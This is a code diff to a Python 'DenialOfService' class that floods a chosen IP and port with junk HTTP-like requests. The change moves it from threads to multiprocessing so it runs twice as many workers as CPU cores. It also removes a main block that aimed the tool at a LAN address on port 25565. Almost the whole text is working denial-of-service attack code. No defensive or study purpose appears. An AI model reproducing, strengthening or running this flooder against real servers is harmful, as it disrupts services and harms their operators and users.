@@ -1,27 +1,34 @@
-import socket
-from threading import Thread
-from time import sleep
+import multiprocessing
 import os
+import socket
+from time import sleep
+
 running = True
 
 
-class DenialOfService():
+class DenialOfService:
     ip = str
     port = int
     running = True
 
     def __init__(self, console):
-        # self.console = console
-        pass
+
+        self.console = console
 
     def start(self):
-        self.running=True
-        for i in range(os.cpu_count()):
-            t = Thread(target=self.dos)
-            t.start()
+        self.procs = []
+        for i in range(os.cpu_count() * 2):
+
+            proc = multiprocessing.Process(target=self.dos)
+            self.procs.append(proc)
+            proc.daemon=True
+            proc.start()
+        print(self.procs.__len__())
 
     def stop(self):
-        self.running = False
+        for i in self.procs:
+            i.terminate()
+            self.console.log(str(i) + " Terminiert")
 
     def setIp(self, ip):
         self.ip = ip
@@ -36,26 +43,7 @@ class DenialOfService():
                 mysocket.connect((self.ip, self.port))
                 mysocket.send(str.encode("GET " + "Haha, DOS!!!" + "HTTP/1.1 \r\n"))
                 mysocket.sendto(str.encode("GET " + "Haha, DOS!!!" + "HTTP/1.1 \r\n"), (self.ip, self.port))
-                print("DOS")
+                print("dos")
             except socket.error:
-                print("error")
+                sleep(3)
             mysocket.close()
-
-
-if __name__ == '__main__':
-    dos = DenialOfService()
-    dos.setIp("192.168.178.57")
-    dos.setPort(25565)
-    dos.start()
-    sleep(10)
-    dos.stop()
-'''
-    try:
-        sock=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        sock.connect(("192.168.178.57", 25565))
-        sock.send("Hi".encode())
-        sock.sendto("Hi".encode(),("192.168.178.57", 25565))
-        print("Ende")
-    except:
-        print("Nö")
-'''
